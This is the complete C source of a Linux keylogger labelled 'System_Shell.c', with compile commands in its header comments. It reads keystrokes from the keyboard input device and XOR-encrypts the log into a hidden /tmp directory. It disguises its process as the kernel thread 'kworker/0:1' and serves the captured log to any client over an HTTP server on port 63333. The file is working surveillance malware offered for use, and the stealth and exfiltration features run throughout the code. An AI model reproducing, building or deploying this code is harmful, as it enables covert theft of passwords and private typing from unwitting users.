/*  System_Shell.c  Keylogger (VM Compatible)  */
/*  sudo apt install -y build-essential g++ make  */
/*  sudo apt install -y libc6-dev  */
/*  sudo apt install build-essential -y  */
/*  Compile: gcc System_Shell_Service.c -o System-Shell-Service -lpthread -O2 -static */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/input.h>
#include <dirent.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <ctype.h>
#include <sys/prctl.h>

#define XOR_KEY         0xAB
#define HTTP_PORT       63333
#define LOG_DIR         "/tmp/.cdt"
#define DEBOUNCE_MS     300

static FILE *g_logFile = NULL;
static volatile sig_atomic_t running = 1;

static void xor_buffer(unsigned char *buf, size_t len, unsigned char key)
{ for (size_t i = 0; i < len; ++i) buf[i] ^= key; }

static void log_event(const char *payload)
{
    static struct timespec last = {0};
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    long diff = (now.tv_sec - last.tv_sec) * 1000 + (now.tv_nsec - last.tv_nsec) / 1000000;
    if (diff < DEBOUNCE_MS && payload[0] == '[') return;
    last = now;

    time_t t = time(NULL);
    char ts[64];
    strftime(ts, sizeof(ts), "[%Y-%m-%d %H:%M:%S] ", localtime(&t));
    char line[512];
    snprintf(line, sizeof(line), "%s%s\n", ts, payload);
    xor_buffer((unsigned char *)line, strlen(line), XOR_KEY);
    fwrite(line, 1, strlen(line), g_logFile);
    fflush(g_logFile);
}

static char *get_mac_address(void)
{
    struct ifaddrs *ifap, *ifa;
    static char mac[18] = "00-00-00-00-00-00";
    getifaddrs(&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET &&
            !(ifa->ifa_flags & IFF_LOOPBACK) && (ifa->ifa_flags & IFF_UP)) {
            struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
            snprintf(mac, sizeof(mac), "%02x-%02x-%02x-%02x-%02x-%02x",
                     s->sll_addr[0], s->sll_addr[1], s->sll_addr[2],
                     s->sll_addr[3], s->sll_addr[4], s->sll_addr[5]);
            break;
        }
    }
    freeifaddrs(ifap);
    return mac;
}

static char *get_local_ip(void)
{
    struct ifaddrs *ifap, *ifa;
    static char ip[16] = "0.0.0.0";
    getifaddrs(&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET &&
            !(ifa->ifa_flags & IFF_LOOPBACK)) {
            struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &sa->sin_addr, ip, sizeof(ip));
            if (strcmp(ip, "127.0.0.1") != 0) break;
        }
    }
    freeifaddrs(ifap);
    return ip;
}

static char *get_log_path(void)
{
    mkdir(LOG_DIR, 0700);
    static char path[256];
    snprintf(path, sizeof(path), "%s/%s_%s.enc", LOG_DIR, get_mac_address(), get_local_ip());
    return path;
}

static const char *keycode_to_string(int code)
{
    if (code >= 2 && code <= 10)  return "123456789" + (code - 2);
    if (code == 11)               return "0";
    if (code >= 16 && code <= 25) return "qwertyuiop" + (code - 16);
    if (code >= 30 && code <= 38) return "asdfghjkl" + (code - 30);
    if (code >= 44 && code <= 50) return "zxcvbnm" + (code - 44);
    if (code == 57)               return " ";
    switch (code) {
        case 28: return "[ENTER]"; case 14: return "[BACKSPACE]"; case 15: return "[TAB]";
        case 42: case 54: return "[SHIFT]"; case 29: case 97: return "[CTRL]";
        case 56: case 100: return "[ALT]"; case 125: case 126: return "[WIN]";
        case 1: return "[ESC]"; case 59: return "[F1]"; case 60: return "[F2]";
        case 61: return "[F3]"; case 62: return "[F4]"; case 63: return "[F5]";
        case 64: return "[F6]"; case 65: return "[F7]"; case 66: return "[F8]";
        case 67: return "[F9]"; case 68: return "[F10]"; case 87: return "[F11]";
        case 88: return "[F12]"; case 105: return "[LEFT]"; case 106: return "[RIGHT]";
        case 103: return "[UP]"; case 108: return "[DOWN]";
        default: { static char buf[16]; snprintf(buf, sizeof(buf), "[KEY_%d]", code); return buf; }
    }
}

static void sig_handler(int signo) { (void)signo; running = 0; }

static void *input_thread(void *arg)
{
    const char *device = (const char *)arg;
    int fd = open(device, O_RDONLY);
    if (fd < 0) { log_event("[ERROR] Failed to open input device"); return NULL; }

    struct input_event ev;
    int shift = 0, ctrl = 0, alt = 0;

    while (running && read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift = 1;
            if (ev.code == KEY_LEFTCTRL  || ev.code == KEY_RIGHTCTRL)  ctrl  = 1;
            if (ev.code == KEY_LEFTALT   || ev.code == KEY_RIGHTALT)   alt   = 1;
            if (ctrl && alt && ev.code == KEY_Q) { log_event("=== STOPPED BY HOTKEY ==="); running = 0; break; }
            const char *key = keycode_to_string(ev.code);
            if (shift && key[0] >= 'a' && key[0] <= 'z') {
                char upper[2] = { (char)toupper((int)key[0]), 0 };
                log_event(upper);
            } else {
                log_event(key);
            }
        }
        if (ev.type == EV_KEY && ev.value == 0) {
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) shift = 0;
            if (ev.code == KEY_LEFTCTRL  || ev.code == KEY_RIGHTCTRL)  ctrl  = 0;
            if (ev.code == KEY_LEFTALT   || ev.code == KEY_RIGHTALT)   alt   = 0;
        }
    }
    close(fd);
    return NULL;
}

static void *http_server_thread(void *arg)
{
    (void)arg;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(HTTP_PORT), .sin_addr.s_addr = INADDR_ANY };
    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) { log_event("[HTTP] Bind failed"); return NULL; }
    listen(srv, 5);
    log_event("[HTTP] Server started on :63333");
    char *log_path = get_log_path();

    while (running) {
        struct sockaddr_in client;
        socklen_t len = sizeof(client);
        int client_fd = accept(srv, (struct sockaddr *)&client, &len);
        if (client_fd < 0) continue;
        char ip[16];
        inet_ntop(AF_INET, &client.sin_addr, ip, sizeof(ip));
        char msg[64];
        snprintf(msg, sizeof(msg), "[HTTP] Client: %s", ip);
        log_event(msg);
        char buf[1024]; recv(client_fd, buf, sizeof(buf), 0);
        FILE *f = fopen(log_path, "rb");
        if (!f) { const char *resp = "HTTP/1.1 404\r\n\r\n"; send(client_fd, resp, strlen(resp), 0); close(client_fd); continue; }
        fseek(f, 0, SEEK_END); long size = ftell(f); fseek(f, 0, SEEK_SET);
        char *data = malloc(size);
        if (fread(data, 1, size, f) != (size_t)size) { free(data); fclose(f); close(client_fd); continue; }
        fclose(f);
        char header[256];
        snprintf(header, sizeof(header),
                 "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %ld\r\n"
                 "Content-Disposition: attachment; filename=\"log.enc\"\r\nConnection: close\r\n\r\n", size);
        send(client_fd, header, strlen(header), 0);
        send(client_fd, data, size, 0);
        free(data); close(client_fd);
    }
    close(srv);
    return NULL;
}

int main(void)
{
    prctl(PR_SET_NAME, "kworker/0:1", 0, 0, 0);
    g_logFile = fopen(get_log_path(), "ab");
    if (!g_logFile) return 1;
    setbuf(g_logFile, NULL);
    log_event("=== CDT LINUX KEYLOGGER STARTED ===");

    char *kb_dev = NULL;
    DIR *dir = opendir("/dev/input");
    if (dir) {
        struct dirent *ent;
        while ((ent = readdir(dir))) {
            if (strncmp(ent->d_name, "event", 5) != 0) continue;
            char path[128];  // Fixed size
            snprintf(path, sizeof(path), "/dev/input/%s", ent->d_name);
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                char name[256] = "unknown";
                ioctl(fd, EVIOCGNAME(sizeof(name)), name);
                if (strstr(name, "Keyboard") || strstr(name, "keyboard") || strstr(name, "keyboard")) {
                    kb_dev = strdup(path);
                    close(fd);
                    break;
                }
                close(fd);
            }
        }
        closedir(dir);
    }

    if (!kb_dev) {
        kb_dev = strdup("/dev/input/event0");
        log_event("[INFO] Using fallback: /dev/input/event0");
    }

    pthread_t http_tid, input_tid;
    pthread_create(&http_tid, NULL, http_server_thread, NULL);
    pthread_create(&input_tid, NULL, input_thread, kb_dev);
    signal(SIGINT, sig_handler); signal(SIGTERM, sig_handler);
    pthread_join(input_tid, NULL); running = 0; pthread_join(http_tid, NULL);
    if (g_logFile) { fflush(g_logFile); fclose(g_logFile); }
    free(kb_dev);
    return 0;
}
